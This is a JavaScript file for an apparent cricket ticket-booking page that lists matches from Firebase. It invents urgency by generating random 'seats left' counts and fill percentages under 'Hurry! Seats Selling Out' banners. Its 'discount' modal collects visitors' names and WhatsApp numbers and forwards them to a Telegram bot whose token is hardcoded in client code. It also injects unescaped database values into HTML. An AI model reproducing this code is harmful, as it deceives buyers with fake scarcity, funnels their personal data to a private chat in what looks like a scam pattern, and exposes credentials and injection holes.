import { db, ref, onValue, push, set } from './firebase.js';

document.addEventListener('DOMContentLoaded', () => {

    const matchList = document.getElementById('match-list');  
    const eventTitle = document.getElementById('event-count-title');  
    const sortFilter = document.getElementById('sort-filter');  

    if (!matchList) return;  

    let matchesData = [];  

    // 🔥 ADDING ANIMATION STYLES DYNAMICALLY FOR FOMO
    if (!document.getElementById('fomo-animations')) {
        const fomoStyle = document.createElement('style');
        fomoStyle.id = 'fomo-animations';
        fomoStyle.innerHTML = `
            @keyframes pulse-fire {
                0% { transform: scale(1); opacity: 1; }
                50% { transform: scale(1.05); opacity: 0.8; }
                100% { transform: scale(1); opacity: 1; }
            }
            @keyframes grad-move {
                0% { background-position: 0% 50%; }
                50% { background-position: 100% 50%; }
                100% { background-position: 0% 50%; }
            }
            @keyframes hurry-move {
                0%, 100% { transform: translateX(0); }
                50% { transform: translateX(5px); }
            }
        `;
        document.head.appendChild(fomoStyle);
    }

    // ==========================================
    // 🔥 FETCH FROM FIREBASE
    // ==========================================
    onValue(ref(db, 'matches'), (snapshot) => {  

        matchList.innerHTML = '';  
        const data = snapshot.val();  

        if (!data) {  
            matchList.innerHTML = `<div class="loading">No Matches Found</div>`;  
            if (eventTitle) eventTitle.innerText = `0 Events`;
            return;  
        }  

        let allMatches = Object.keys(data).map(id => ({  
            id,  
            ...data[id]  
        }));  

        const today = new Date();
        today.setHours(0, 0, 0, 0); 

        const upcomingMatches = allMatches.filter(match => {
            const matchDate = new Date(match.date);
            matchDate.setHours(0, 0, 0, 0);
            return matchDate >= today; 
        });

        upcomingMatches.sort((a, b) => new Date(a.date) - new Date(b.date));
        matchesData = upcomingMatches;  
        renderMatches(upcomingMatches);  
    });

    if (sortFilter) {
        sortFilter.addEventListener('change', () => {  
            let sorted = [...matchesData];  
            if (sortFilter.value === 'price-asc') {  
                sorted.sort((a, b) => (Number(a.price) || 0) - (Number(b.price) || 0));  
            } else {  
                sorted.sort((a, b) => new Date(a.date) - new Date(b.date));  
            }  
            renderMatches(sorted);  
        });
    }

    // ==========================================
    // 🔥 RENDER MATCHES (Fixed UI + Moving Hurry)
    // ==========================================
    function renderMatches(matches) {  

        matchList.innerHTML = '';  
        if (eventTitle) eventTitle.innerText = `${matches.length} Events`;  

        matches.forEach(match => {  

            const date = new Date(match.date);  
            const day = date.getDate() || '';  
            const month = date.toLocaleString('default', { month: 'short' });  
            const week = date.toLocaleString('default', { weekday: 'short' });  

            const venueString = match.venue || '';
            let stadiumName = venueString;
            let cityName = '';
            
            if (venueString.includes(',')) {
                const parts = venueString.split(',');
                stadiumName = parts[0].trim();
                cityName = parts[1].trim();
            } else if (venueString.includes(':')) {
                const parts = venueString.split(':');
                stadiumName = parts[0] ? parts[0].trim() : '';
                cityName = parts[1] ? parts[1].trim() : '';
            }

            // 🔥 RANDOM SEATS LEFT LOGIC
            const randomSeats = Math.floor(Math.random() * (400 - 85 + 1)) + 85; 
            const randomPercent = Math.floor(Math.random() * (95 - 75 + 1)) + 75;

            const div = document.createElement('div');  
            div.className = 'timeline-row';  

            div.innerHTML = `  
                <div class="timeline-left">  
                    <div class="date-val">${day}</div>  
                    <div class="month-val">${month}</div>  
                    <div class="day-val">${week}</div>  
                    <div class="city-val" style="font-size: 11px; color: #888; margin-top: 4px; font-weight: 500;">${cityName}</div>  
                </div>  

                <div class="timeline-right" style="width: 100%;">  
                    
                    <div style="background: linear-gradient(90deg, #ff416c, #ff4b2b, #ff416c); background-size: 200% 200%; animation: grad-move 2s ease infinite, hurry-move 1.5s ease-in-out infinite; color: white; font-size: 10px; font-weight: 800; padding: 4px 10px; border-radius: 4px; display: inline-block; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.5px; box-shadow: 0 2px 5px rgba(255, 75, 43, 0.4);">
                        ⏳ Hurry! Seats Selling Out
                    </div>

                    <div class="teams-vs-ui">  
                        <div class="team-ui">  
                            <img src="${match.team1 || ''}" onerror="this.src='https://via.placeholder.com/50'">
                            <span>${(match.title || '').split(' vs ')[0] || 'Team A'}</span>  
                        </div>  
                        <div class="vs-circle">VS</div>  
                        <div class="team-ui">  
                            <img src="${match.team2 || ''}" onerror="this.src='https://via.placeholder.com/50'">
                            <span>${(match.title || '').split(' vs ')[1] || 'Team B'}</span>  
                        </div>  
                    </div>  
                    
                    <div class="venue-time" style="font-size: 12px; color: #555; margin-top: 10px;">  
                        ${match.time || ''} • ${stadiumName}  
                    </div>  

                    <div style="margin-top: 12px; background: #fff5f5; padding: 8px 10px; border-radius: 6px; border: 1px solid #ffe4e6;">
                        <div style="display: flex; justify-content: space-between; align-items: center; font-size: 10.5px; font-weight: 800; margin-bottom: 6px; white-space: nowrap;">
                            <span style="color: #e11d48; display: flex; align-items: center; gap: 4px; animation: pulse-fire 1.2s infinite; transform-origin: left center;">
                                🔥 Hot in demand
                            </span>
                            <span style="color: #be123c; margin-left: 5px;">ONLY ${randomSeats} LEFT!!</span>
                        </div>
                        <div style="background: #e2e8f0; height: 5px; border-radius: 10px; overflow: hidden;">
                            <div style="background: #e11d48; width: ${randomPercent}%; height: 100%; border-radius: 10px;"></div>
                        </div>
                    </div>

                    <div class="action-link" style="color: #f84464; font-size: 13px; font-weight: 600; margin-top: 12px;">
                        ₹${match.price || 0} Fast Filling. Book Now &gt;
                    </div>  
                </div>  
            `;  

            // 🔥 MATCH CARD CLICK -> OPEN MODAL 🔥
            div.addEventListener('click', () => {  
                const cleanMatch = {
                    id: match.id || "", title: match.title || "TBC vs TBC",
                    banner: match.banner || "", venue_img: match.venue_img || "",  
                    date: match.date || "", time: match.time || "",
                    venue: match.venue || "", price: match.price || 0,
                    team1: match.team1 || "", team2: match.team2 || ""
                };

                localStorage.setItem('selectedMatch', JSON.stringify(cleanMatch));  
                localStorage.setItem('matchId', match.id);  

                const modal = document.getElementById('discount-modal');
                if (modal) {
                    modal.style.display = 'flex';
                    setTimeout(() => modal.classList.add('active'), 10);
                } else {
                    window.location.href = 'event.html'; 
                }
            });

            matchList.appendChild(div);  
        });
    }

    // ==========================================
    // 🔥 DISCOUNT MODAL & TELEGRAM ALERT 🔥
    // ==========================================
    const claimBtn = document.getElementById('claim-btn');
    const skipBtn = document.getElementById('skip-discount');
    const closeModalBtn = document.getElementById('close-modal');
    const errorMsg = document.getElementById('lead-error');

    if(claimBtn) {
        claimBtn.addEventListener('click', async () => {
            const name = document.getElementById('lead-name').value.trim();
            const phone = document.getElementById('lead-phone').value.trim();

            if (name.length < 2 || phone.length < 10) {
                errorMsg.style.display = 'block';
                return;
            }

            errorMsg.style.display = 'none';
            claimBtn.innerText = 'Applying Discount...';
            claimBtn.style.background = '#94a3b8'; 
            claimBtn.disabled = true;

            const matchId = localStorage.getItem('matchId') || "N/A";
            const matchData = JSON.parse(localStorage.getItem('selectedMatch') || "{}");
            const matchTitle = matchData.title || matchId;

            // --- 🚀 1. SEND TELEGRAM MESSAGE FIRST (AWAIT) ---
            const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
            const chatId = "6820660513"; 
            
            const telegramMsg = `🚨 *NEW HOT LEAD! (HomePage)* 🚨\n\n` +
                                `👤 *Name:* ${name}\n` +
                                `📞 *WhatsApp:* ${phone}\n` +
                                `🏏 *Match:* ${matchTitle}\n` +
                                `💡 *Status:* Claimed ₹150 Discount`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;

            try {
                await fetch(url);
            } catch (err) {
                console.log("Telegram alert failed, but continuing...");
            }

            // --- 🚀 2. SAVE TO FIREBASE ---
            try {
                const newLeadRef = push(ref(db, 'leads')); 
                await set(newLeadRef, {
                    name: name,
                    phone: phone,
                    match_id: matchId,
                    date: new Date().toISOString(),
                    status: 'lead_captured'
                });
            } catch (error) {
                console.log("Firebase save failed, but continuing...");
            }

            localStorage.setItem('customerName', name);
            localStorage.setItem('customerPhone', phone);
            localStorage.setItem('hasDiscount', 'true'); 

            // --- 🚀 3. FINALLY REDIRECT ---
            window.location.href = 'event.html'; 
        });
    }

    const skipToEvent = () => {
        localStorage.setItem('hasDiscount', 'false'); 
        window.location.href = 'event.html';
    };

    if(skipBtn) skipBtn.addEventListener('click', skipToEvent);
    if(closeModalBtn) closeModalBtn.addEventListener('click', skipToEvent);

});
